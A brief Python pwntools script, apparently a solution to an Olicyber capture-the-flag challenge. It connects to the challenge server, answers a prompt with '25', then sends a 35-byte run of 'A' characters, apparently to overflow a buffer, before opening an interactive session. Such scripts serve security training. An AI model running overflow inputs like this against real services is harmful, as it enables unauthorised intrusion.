from pwn import *

HOST = "privateclub.challs.olicyber.it"
PORT = 10015

s = remote(HOST, PORT)

data = s.recvline()
s.sendline(b"25")
data = s.recvline()

s.sendline(b'A' * 34 + b'A')

data = s.recv()
s.interactive()
